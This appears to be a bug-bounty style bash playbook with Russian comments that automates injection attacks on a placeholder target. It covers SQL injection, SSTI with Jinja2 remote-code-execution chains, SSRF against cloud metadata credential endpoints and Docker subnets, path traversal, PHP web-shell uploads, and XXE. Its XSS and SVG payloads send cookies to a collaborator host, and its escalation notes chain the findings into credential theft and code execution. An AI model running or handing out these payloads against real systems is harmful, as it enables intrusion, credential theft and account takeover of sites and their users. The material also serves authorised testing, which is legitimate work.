# M4_INJECT — SQLi · SSTI · SSRF · LFI · XSS · XXE · Upload
# Trigger: 500 error / SQL error / SSTI hit / URL-param / upload endpoint
# Needs: TARGET · TOKEN · COLLAB_URL · vulnerable ENDPOINT · PARAM

TARGET="https://TARGET"
TOKEN="Bearer JWT"
COLLAB_URL="xyz.oastify.com"
EP="api/endpoint"
PARAM="id"

## [I1] SQL INJECTION

# Boolean detection (loop-var P — чтобы НЕ затирать глобальный $PARAM="id"
#                    для time/error/POST-секций ниже)
for P in id user_id order_id q search filter student_id account_id; do
  R1=$(curl -sk "$TARGET/$EP?$P=1 AND 1=1-- -" -H "Authorization: $TOKEN" | wc -c)
  R2=$(curl -sk "$TARGET/$EP?$P=1 AND 1=2-- -" -H "Authorization: $TOKEN" | wc -c)
  [ "$R1" != "$R2" ] && echo "BOOLEAN SQLi: $P (diff: $((R1-R2)) bytes) → escalate"
done

# Time-based (stacked-запросы 1;SELECT SLEEP() редко исполняются через PHP/MySQLi —
#             поэтому инъекция в ТЕКУЩИЙ запрос через AND/OR)
time curl -sk "$TARGET/$EP?$PARAM=1 AND SLEEP(5)-- -"           -H "Authorization: $TOKEN"
time curl -sk "$TARGET/$EP?$PARAM=1' AND SLEEP(5)-- -"          -H "Authorization: $TOKEN"
time curl -sk "$TARGET/$EP?$PARAM=1' OR SLEEP(5)-- -"           -H "Authorization: $TOKEN"
time curl -sk "$TARGET/$EP?$PARAM=1';WAITFOR DELAY '0:0:5'-- -" -H "Authorization: $TOKEN"   # MSSQL

# Error-based (payloads НЕ деструктивные — никаких DROP/DELETE на чужом проде!)
for p in "'" "''" "1'" "1\"" "1\`" "1' OR '1'='1" "1')" "1))"; do
  RESP=$(curl -sk "$TARGET/$EP?$PARAM=$p" -H "Authorization: $TOKEN")
  echo "$RESP" | grep -iE "SQL syntax|mysqli?_|PDOException|PG::|psql:|sqlite3|ORA-[0-9]{4,}|SQLSTATE|1064|unterminated|quoted string not" | head -3 && \
    echo "SQLi error: PARAM=$PARAM payload=$p"
done

# Header-based
for h in "X-Forwarded-For" "User-Agent" "Referer" "X-Real-IP" "Cookie"; do
  TIME=$(curl -sk -w "%{time_total}" -o /dev/null "$TARGET/$EP" \
    -H "Authorization: $TOKEN" -H "$h: 1' OR SLEEP(5)-- -")
  echo "$h timing: $TIME"
  python3 -c "import sys; exit(0 if float('$TIME') < 4 else 1)" || \
    echo "[P0] header-SQLi | $h | SLEEP(5) → time $TIME"
done

# POST JSON
curl -sk -X POST "$TARGET/$EP" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
  -d '{"id":"1 AND SLEEP(5)-- -"}' -w "\nTime: %{time_total}"

# sqlmap (after detection confirmed)
# sqlmap -u "$TARGET/$EP?$PARAM=1" --headers="Authorization: $TOKEN" \
#        --level=5 --risk=3 --dbs --batch --technique=BEUSTQ

## [I2] SSTI — Server-Side Template Injection

for payload in "{{7*7}}" "\${7*7}" "<%= 7*7 %>" "{7*7}" "#{7*7}" \
               "{{7*'7'}}" "${{7*7}}" "{{config}}" "{{self}}" "@{7*7}"; do
  RESP=$(curl -sk "$TARGET/$EP?name=$payload" -H "Authorization: $TOKEN")
  echo "$RESP" | grep -qE "\b(49|7777777)\b" && \
    echo "SSTI HIT: $payload → escalate to RCE"
done

# Jinja2 RCE chain — index-independent (НЕ полагаться на __subclasses__()[396]:
#   индекс плавает между версиями/сборками и почти всегда неверный)
python3 - <<'PY'
import urllib.parse
for rce in [
  "{{lipsum.__globals__['os'].popen('id').read()}}",
  "{{cycler.__init__.__globals__.os.popen('id').read()}}",
  "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
  "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
]:
    print(urllib.parse.quote(rce))
PY
# → insert into vulnerable param → "uid=..." in response = RCE P0

## [I3] SSRF

# Detection via OOB (do on EVERY url/redirect/callback/src/file param)
for param in avatar_url image_url webhook_url callback_url redirect_url \
             fetch_url url src logo_url link target dest next return; do
  curl -sk -X POST "$TARGET/api/profile" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d "{\"$param\": \"http://$COLLAB_URL/$param\"}" > /dev/null
  curl -sk "$TARGET/$EP?$param=http://$COLLAB_URL/$param" \
    -H "Authorization: $TOKEN" > /dev/null
done
echo "→ Check Collaborator DNS/HTTP hit. Hit = Blind SSRF P0"

# Internal network (only after OOB confirmed)
# ПРИМ.: AWS IMDSv2 требует PUT /latest/api/token + заголовок X-aws-ec2-metadata-token →
#        простой GET ниже отдаёт данные только на IMDSv1. GCP требует Metadata-Flavor: Google,
#        иначе 403. Если SSRF не прокидывает заголовки/метод — облачный meta может не сработать
#        (не ложный dead-end, а ограничение вектора).
for url in \
  "http://127.0.0.1:6379/" \
  "http://127.0.0.1:9200/_cat/indices" \
  "http://127.0.0.1:8080/admin" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  "http://100.100.100.200/latest/meta-data/" \
  "http://192.168.1.1/" "http://10.0.0.1/"; do
  RESP=$(curl -sk -X POST "$TARGET/api/profile" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d "{\"avatar_url\": \"$url\"}")
  echo "$RESP" | grep -iE "key|credential|secret|ARN|ami-|InstanceId|ListBuckets|AccessKeyId" | head -3 && \
    echo "[P0] SSRF-internal | $url | credentials/data in response"
done
# GCP meta (нужен спец-заголовок — только если SSRF умеет прокидывать headers):
#   curl ... "http://metadata.google.internal/computeMetadata/v1/?recursive=true" -H "Metadata-Flavor: Google"

# Docker subnet scan (after SSRF confirmed)
for net in 172.17 172.18; do          # 172.17.0.0/16 = дефолтный docker0 bridge, 172.18+ = user-defined
  for i in $(seq 1 30); do
    for port in 80 8080 8000 3000 5432 6379 27017 9200 15672; do
      RESP=$(curl -sk --max-time 2 -X POST "$TARGET/api/profile" \
        -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
        -d "{\"avatar_url\": \"http://$net.0.$i:$port/\"}")
      [ ${#RESP} -gt 10 ] && echo "[P0] SSRF-docker | $net.0.$i:$port | response ${#RESP}b"
    done
  done
done

## [I4] LFI / Path Traversal

for path in \
  "../../../etc/passwd" \
  "....//....//....//etc/passwd" \
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
  "..%252f..%252f..%252fetc%252fpasswd" \
  "php://filter/convert.base64-encode/resource=index.php" \
  "file:///etc/passwd"; do
  RESP=$(curl -sk "$TARGET/$EP?file=$path" -H "Authorization: $TOKEN")
  echo "$RESP" | grep -q "root:" && \
    echo "[P1] LFI | file=$path | /etc/passwd readable → escalate to RCE"
done

## [I5] FILE UPLOAD


for ext in php phtml php5 php7 phar shtml; do
  curl -sk -X POST "$TARGET/api/upload" \
    -H "Authorization: $TOKEN" \
    -F "file=@/dev/stdin;filename=shell.$ext;type=image/jpeg" <<< '<?php echo shell_exec($_GET["c"]); ?>' | \
    grep -iE "url|path|file|location" | head -5
done

# SVG XSS + SSRF
curl -sk -X POST "$TARGET/api/upload" \
  -H "Authorization: $TOKEN" \
  -F "file=@/dev/stdin;filename=xss.svg;type=image/svg+xml" <<< \
  "<svg><script>fetch('http://$COLLAB_URL/'+document.cookie)</script></svg>"

# Extension-trick bypass (null-byte %00 — ЛЕГАСИ, PHP<5.3.4; в multipart %00 уходит
#   литералом, не реальным \0 → почти всегда мёртв. Актуальнее двойное/смешанное расширение):
for fn in "shell.php.jpg" "shell.jpg.php" "shell.php." "shell.pHp" "shell.phtml"; do
  curl -sk -X POST "$TARGET/api/upload" \
    -H "Authorization: $TOKEN" \
    -F "file=@/dev/stdin;filename=$fn;type=image/jpeg" <<< '<?php system("id"); ?>' | \
    grep -iE "url|path|file|location" | head -3 && echo "uploaded as $fn"
done

## [I6] XSS (stored only → victim context)

# Blind XSS into admin fields (name, comment, bio, address, company, reason)
# NB: src был "//http://..." (битый URL, тест молча падал) → протокол-относительный //$COLLAB_URL
BXSS="<script src=//$COLLAB_URL/x.js></script>"
# BXSS2 (attribute-breakout) — для HTML/form-контекста; в JSON ниже не кладём (кавычки ломают -d):
#   "><img src=x onerror=fetch('https://$COLLAB_URL/c='+encodeURIComponent(document.cookie))>

for field in name comment bio address company reason subject title; do
  curl -sk -X PATCH "$TARGET/api/profile" \
    -H "Authorization: $TOKEN" -H "Content-Type: application/json" \
    -d "{\"$field\": \"$BXSS\"}" > /dev/null
done
echo "→ Check Collaborator: JS load = XSS in admin UI. Cookie = ATO P0"

## [I7] XXE (XML/SOAP endpoints)

curl -sk -X POST "$TARGET/$EP" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request><data>&xxe;</data></request>'

# Blind XXE / OOB (ответ не отражается → параметрические сущности + внешняя DTD).
#   На '"$COLLAB_URL"'/evil.dtd положить:
#   <!ENTITY % p SYSTEM "file:///etc/passwd">
#   <!ENTITY % e "<!ENTITY &#x25; x SYSTEM 'http://'"$COLLAB_URL"'/?d=%p;'>">%e;%x;
curl -sk -X POST "$TARGET/$EP" \
  -H "Authorization: $TOKEN" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % dtd SYSTEM "http://'"$COLLAB_URL"'/evil.dtd"> %dtd; ]>
<request><data>test</data></request>'

## TRIGGERS

→ SSRF to AWS IMDS got credentials → AWS CLI → S3/IAM → P0 escalate
→ SQLi confirmed → sqlmap_scan immediately
→ RCE via SSTI → `id` in response → [P0] immediate report
→ LFI reads files → log poisoning → RCE chain
